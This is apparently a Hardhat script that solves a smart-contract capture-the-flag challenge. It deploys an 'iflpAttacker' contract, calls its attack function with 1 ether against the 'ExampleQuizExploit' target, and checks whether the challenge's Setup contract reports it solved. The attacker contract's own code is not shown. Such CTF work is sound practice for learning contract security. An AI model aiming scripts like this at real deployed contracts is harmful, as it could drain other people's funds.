const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("iflpAttacker");

  const setup = await ethers.getContractAt( "Setup", "0x38B500E61267Ee672c823bE3a8fA559236Bd1FD3" );
  const ctf = await ethers.getContractAt( "ExampleQuizExploit", "0x070Cd04E0Ab2bF1E10411f7aB1b0972164F72879" );

  console.log("solved:", await setup.isSolved());

  const exploit = await EXPLOIT.deploy();
  await exploit.attack(ctf.address, { value: parseEther("1") });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
